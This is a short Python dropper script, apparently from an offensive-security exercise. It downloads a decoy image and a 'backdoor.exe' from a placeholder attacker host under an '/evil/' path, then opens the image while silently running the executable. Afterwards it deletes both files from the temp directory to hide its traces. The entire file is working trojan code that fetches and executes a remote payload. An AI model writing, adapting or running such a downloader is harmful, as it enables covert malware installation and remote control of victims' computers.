#!/usr/bin/env python

import requests, subprocess, os, tempfile

def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)



temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
download("http://<IP ADDRESS>/evil/potato.jpg")
subprocess.Popen("potato.jpg", shell=True)

download("http://<IP ADDRESS>/evil/backdoor.exe")
subprocess.call("backdoor.exe", shell=True)

os.remove("potato.jpg")
os.remove("backdoor.exe")